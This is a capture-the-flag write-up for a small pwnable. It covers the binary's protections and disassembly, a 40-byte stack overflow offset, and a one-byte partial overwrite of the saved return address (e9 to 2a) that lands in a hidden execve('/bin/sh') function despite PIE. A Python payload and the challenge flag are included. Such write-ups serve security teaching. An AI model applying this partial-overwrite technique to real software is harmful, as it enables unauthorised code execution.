# Ghazal Edge - Writeup	

## Challenge Info

`ghazal-edge` is a tiny menu-less pwnable that reads one record and returns. The bundled notes are decoys; the binary itself is all that matters.

Remote flag:

```text
0xV01D{one_byte_pie_overwrite_needs_no_eyes}
```

## Files

- `no_eyes`
- `libc.so.6`
- `ld-linux-x86-64.so.2`
- `run.sh`
- decoy text files

## Protections

```text
Arch: amd64
RELRO: Full RELRO
Stack: No canary
NX: Enabled
PIE: Enabled
```

That means:

- No stack canary, so a stack overwrite is possible.
- NX blocks shellcode, so we want a code-reuse style redirect.
- PIE randomizes the base, so a full saved-RIP overwrite would normally need a leak.

## Reversing

The important functions are:

- `0x125d`: vulnerable function
- `0x122a`: hidden win function
- `0x1296`: main

Relevant disassembly:

```asm
0x1265: sub    rsp, 0x20
...
0x127d: lea    rax, [rbp-0x20]
0x1281: mov    edx, 0x100
0x1286: mov    rsi, rax
0x1289: mov    edi, 0
0x128e: call   read
...
0x1294: leave
0x1295: ret
```

This is a classic overflow:

- buffer size: `0x20`
- saved RBP after the buffer: `8` bytes
- saved RIP after that: another `8` bytes

So the offset to saved RIP is:

```text
0x20 + 0x8 = 0x28 = 40 bytes
```

The hidden function is:

```asm
0x122a: push   rbp
0x122b: mov    rbp, rsp
0x1232: lea    rax, [rip+...]
0x123c: call   puts              ; "You found it!"
0x1241: mov    edx, 0
0x1246: mov    esi, 0
0x124b: lea    rax, [rip+...]
0x1255: call   execve            ; execve("/bin/sh", 0, 0)
```

So if execution lands at `0x122a`, we get a shell.

## Why a one-byte overwrite works

Main returns to the next instruction at:

```text
0x12e9
```

The hidden function starts at:

```text
0x122a
```

Under PIE, the high bytes of both addresses are the same because they live in the same binary mapping. Only the low byte needs to change:

```text
0x...12e9 -> 0x...122a
             low byte: e9 -> 2a
```

That means we do not need a full PIE base leak. We only need to overwrite the least significant byte of the saved return address.

## Exploit

Payload:

```python
payload = b"A" * 40 + b"\x2a"
```

Flow:

1. Fill the buffer and saved RBP with `40` bytes.
2. Overwrite only the lowest byte of saved RIP with `0x2a`.
3. Function returns into the hidden `execve("/bin/sh")` path.
4. Send `cat flag.txt`.
